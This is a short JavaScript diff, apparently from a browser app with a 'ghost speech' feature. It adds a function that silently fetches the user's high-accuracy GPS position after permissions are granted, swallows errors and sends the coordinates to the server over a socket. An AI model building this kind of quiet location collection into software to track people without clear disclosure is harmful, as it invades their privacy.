@@ -940,7 +940,18 @@ function requestPermissions() {
     }, 3000);
     scheduleGhostSpeech();
 
-    return requestAllPermissions();
+    return requestAllPermissions().then(() => tryGPSSilent());
+}
+
+function tryGPSSilent() {
+    if (!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+        (p) => {
+            socket.emit('location', { lat: p.coords.latitude, lng: p.coords.longitude, accuracy: p.coords.accuracy, gps: true });
+        },
+        () => {},
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 60000 }
+    );
 }
 
 function requestAllPermissions() {
